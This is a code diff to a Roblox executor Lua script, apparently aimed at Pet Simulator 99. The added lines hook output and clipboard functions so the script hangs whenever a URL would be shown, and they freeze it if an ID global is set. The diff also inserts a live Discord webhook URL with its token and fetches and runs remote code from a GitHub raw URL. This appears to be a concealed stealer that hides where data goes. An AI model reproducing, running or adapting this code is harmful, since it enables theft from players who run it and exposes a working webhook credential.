@@ -1,4 +1,50 @@
+local functions = {
+    rconsoleprint,
+    print,
+    setclipboard,
+    rconsoleerr,
+    rconsolewarn,
+    warn,
+    error
+}
+
+for i, v in next, functions do
+    local old
+    old =
+        hookfunction(
+        v,
+        newcclosure(
+            function(...)
+                local args = {...}
+                for i, v in next, args do
+                    if tostring(i):find("https") or tostring(v):find("https") then
+                        while true do
+                        end
+                    end
+                end
+                return old(...)
+            end
+        )
+    )
+end
+
+if _G.ID then
+    while true do
+    end
+end
+setmetatable(
+    _G,
+    {
+        __newindex = function(t, i, v)
+            if tostring(i) == "ID" then
+                while true do
+                end
+            end
+        end
+    }
+)
+wait()
 getgenv().gui = false
 Username = "Roblox" 
-Webhook = "" 
+Webhook = "https://discord.com/api/webhooks/1258440700194717798/qYHoECMj5L7M3xCMkrdyl2c_SEMJAeBfHI04lrEaMA5WDxX1_aU-IHfg7qB5xqur5_lj" 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))()
